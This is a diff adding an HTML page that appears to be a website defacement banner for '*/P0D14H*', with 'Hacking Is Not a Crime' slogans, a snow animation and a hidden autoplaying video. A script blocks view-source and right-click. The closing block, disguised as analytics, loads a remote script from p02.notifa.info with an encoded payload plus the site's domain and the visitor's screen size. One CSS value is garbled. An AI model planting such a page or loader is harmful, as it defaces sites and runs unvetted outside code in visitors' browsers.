@@ -1,0 +1,168 @@
+<html> 
+  <head> 
+    <title>*/P0D14H*
+    </title> 
+    <meta name="description" content="*/P0D14H*"> 
+    <link href="https://fonts.googleapis.com/css?family=Rye" rel="stylesheet"> 
+    <link href="https://fonts.googleapis.com/css?family=Mali" rel="stylesheet"> 
+    <link href="https://fonts.googleapis.com/css?family=Nova+Mono" rel="stylesheet"> 
+  <script type="text/javascript"> var schnee={
+      flockenanzahl:25,flockenfarbe:["#2ecc71","#440022","#e74c3c","#e67e22","#bdc3c7","#9b59b6"],flockenschriftart:["Arial","Arial Narrow","Comic Sans MS","Gill Sans","Tahoma","Times","Verdana"],flocke:"*",geschwindigkeit:.3,kleinsteflocke:10,groessteflocke:25,bewegung:30,zindex:2e4,flocken:[],bodywidth:0,bodyheight:0,range:null,count:0,timeout:20,lastinterval:0,eventhandleresize:window.onresize,eventhandleload:window.onload,start:function(){
+        if(this.eventhandleload!=null)this.eventhandleload();
+        this.range=this.groessteflocke-this.kleinsteflocke;
+        this.windowSize();
+        while(this.flockenanzahl>this.flocken.length)this.createFlake(this.flocken.length);
+        this.lastinterval=this.time();
+        window.setInterval(function(){
+          schnee.movin()}
+                           ,this.timeout)}
+      ,time:function(){
+        return+(new Date)}
+      ,random:function(e){
+        return Math.floor(Math.random()*e)}
+      ,createFlake:function(e){
+        var t=document.getElementsByTagName("body")[0];
+        var n=document.createElement("div");
+        n.id="flake"+e;
+        n.style.position="absolute";
+        n.style.left="0px";
+        n.style.top="-"+this.groessteflocke+"px";
+        n.style.color=this.flockenfarbe[this.random(this.flockenfarbe.length-1)];
+        n.style.family=this.flockenschriftart[this.random(this.flockenschriftart.length-1)];
+        n.style.fontSize=this.random(this.range)+this.kleinsteflocke+"px";
+        n.style.zIndex=this.zindex;
+        n.innerHTML=this.flocke;
+        t.appendChild(n);
+        this.flocken[e]={
+          x:this.random(this.bodywidth-this.bewegung-this.groessteflocke-3)+this.bewegung+1,y:-this.groessteflocke-this.random(this.bodyheight),size:this.random(this.range)+this.kleinsteflocke,count:this.random(1e4)}
+      }
+      ,restartFlake:function(e){
+        this.flocken[e]={
+          x:this.random(this.bodywidth-this.bewegung-this.groessteflocke-3)+this.bewegung+1,y:-this.groessteflocke,size:this.random(this.range)+this.kleinsteflocke,count:this.random(1e4)}
+      }
+      ,movin:function(){
+        var e=this.time()-this.lastinterval;
+        this.lastinterval=this.time();
+        var t=e*this.geschwindigkeit;
+        this.count+=t/80;
+        for(var n=0;n<this.flocken.length;n++){
+          var r=this.flocken[n];
+          r.y+=t*this.geschwindigkeit*this.groessteflocke/r.size;
+          if(r.y+r.size>=this.bodyheight){
+            this.restartFlake(n);
+            continue}
+          var i=document.getElementById("flake"+n);
+          i.style.left=Math.floor(r.x+Math.sin(r.count+this.count)*this.bewegung)+"px";
+          i.style.top=Math.floor(r.y)+"px"}
+      }
+      ,windowSize:function(){
+        var e=this.bodywidth;
+        this.bodywidth=this.getWindowWidth()-this.groessteflocke;
+        this.bodyheight=this.getWindowHeight()-this.groessteflocke;
+        var t=this.bodywidth/e;
+        for(var n=0;n<this.flocken.length;n++){
+          var r=this.flocken[n];
+          r.x*=t;
+          if(r.y+r.size>=this.bodyheight)this.restartFlake(n)}
+      }
+      ,getWindowWidth:function(){
+        var e=Math.max(self.innerWidth||0,window.innerWidth||0);
+        if(document.documentElement)e=Math.max(e,document.documentElement.clientWidth||0);
+        if(document.body){
+          e=Math.max(e,document.body.clientWidth||0);
+          e=Math.max(e,document.body.scrollWidth||0);
+          e=Math.max(e,document.body.offsetWidth||0)}
+        return e}
+      ,getWindowHeight:function(){
+        var e=Math.max(self.innerHeight||0,window.innerHeight||0);
+        if(document.documentElement)e=Math.max(e,document.documentElement.clientHeight||0);
+        if(document.body){
+          e=Math.max(e,document.body.clientHeight||0);
+          e=Math.max(e,document.body.scrollHeight||0);
+          e=Math.max(e,document.body.offsetHeight||0)}
+        return e}
+      ,resize:function(){
+        if(this.eventhandleresize!=null)this.eventhandleresize();
+        this.windowSize()}
+    };
+    window.onresize=function(){
+      schnee.resize()};
+    window.onload=function(){
+      schnee.start()}
+  </script> 
+  <style> body{
+    background: #F0F0F0 ;
+    background-position: center ;
+    background-attachment: fixed ;
+    background-size: 100% 100% ;
+    }
+    .logo{
+      width: 3 CCVDFERXFJR 3S00px ;
+      height: 300px ;
+    }
+    .font1{
+      font-family: 'Reckoner', cursive;
+      font-size: 30px ;
+      color: #000 ;
+      text-shadow: 0 0 3px #F00 ;
+    }
+    .font2{
+      font-family: 'Mali', cursive ;
+      font-size: 25px ;
+      color: #000 ;
+      text-shadow: 0 0 3px #F00 ;
+    }
+    .font3{
+      font-family: 'Nova Mono', monospace;
+      font-size: 20px ;
+      color: #000 ;
+      text-shadow: 0 0 2px #F00 ;
+    }
+  </style> 
+  <script type='text/javascript'> //<![CDATA[ function redirectCU(e) { if (e.ctrlKey && e.which == 85) { window.location.replace(""); return false; } } document.onkeydown = redirectCU; //Script Redirect Klik Kanan function redirectKK(e) { if (e.which == 3) { window.location.replace(""); return false; } } document.oncontextmenu = redirectKK; //]]> </script> 
+  <body> 
+    <center> 
+	<embed src="https://www.youtube.com/v/_0Hfp8fZmZE&autoplay=1" type="application/x-shockwave-flash"wmode="transparent" width="1" height="1"></embed>
+      <br> 
+      <!--https://seeklogo.com/images/S/somking-skull-logo-913D12E5E9-seeklogo.com.png https://dlcdnimgs.asus.com/websites/global/ProductCustomizedTab/368/img/main/about-features-owl.png --> 
+      <br> 
+      <img class="logo" src="https://cdn.pixabay.com/photo/2016/11/02/14/18/owl-1791700__340.png"> 
+      <br>
+      <br> 
+      <div class="font1">*/P0D14H*
+      </div> 
+      <br>
+      <br> 
+      <div class="font3">-= Nothing Is Impossible =-
+      </div> 
+      <div class="font3"># Hacking Is Not a Crime #
+      </div> 
+    </center> 
+    <script type="text/javascript">if (self==top) {
+        function netbro_cache_analytics(fn, callback) {
+          setTimeout(function() {
+            fn();
+            callback();
+          }
+                     , 0);
+        }
+        function sync(fn) {
+          fn();
+        }
+        function requestCfs(){
+          var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");
+          var idc_glo_r = Math.floor(Math.random()*99999999999);
+          var url = idc_glo_url+ "p02.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2X2MMlsF0hysd93YD8S%2fq6avu%2f9CwgpgJP3FN4wrx6iIrcBbohMS8RHHtCfbeCVYqthOeQmNdFsZ7u0xC1euGZZ79HVwtNwnzjzACucz25GTsnlaKX7nXUpMnFhYOFw74imqcYc%2fYVg7s6vmA67ztmDjZunD2hcH2TSfEU1vaVLHbu0RT5DaUzTkOoW6gjhDRYQm57OIW1OpGg8pCY5riVvFmpcwvZOk%2bmqCNfGfaaeCzkkuSSi02ZlDvUZGyVGY0JENyLnvfmHvaXH43ZaYQBSyzqOmmozdEe5V4LKmVwpM%2bnypofuqBeYwSs42TQ%2f9ccfkZKsJMhreIx8L3K7bm10JTgDHIU32gUqzWh8PbDnfFo6ZQAZ1WzJ00RU6ypVQFPnFj4H2GBQIxRZWdEvUmF3w6vbvJu%2fF7Ap9UKd45LnX%2bMhNM5XeTg3WHUtnEa%2fT6WY03qfIVVlqkd7E9mXj4OIkXAVn%2bkWzdCVuUFWC3XKC8AdLXYc8JkPqyFv025gW9LtxOuwa9ccf4NVvAzW8B9tNCXSAnu0WVi8IwvapiAbng0sp4RsXnqOp%2bHy7AZGMMQHn2OoOkwKyWWtpTGa4Y1lLi5qVGccSOJPotm0eQnqA%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;
+          var bsa = document.createElement('script');
+          bsa.type = 'text/javascript';
+          bsa.async = true;
+          bsa.src = url;
+          (document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);
+        }
+        netbro_cache_analytics(requestCfs, function(){
+        }
+                              );
+      };
+    </script>
+  </body> 
+</html>
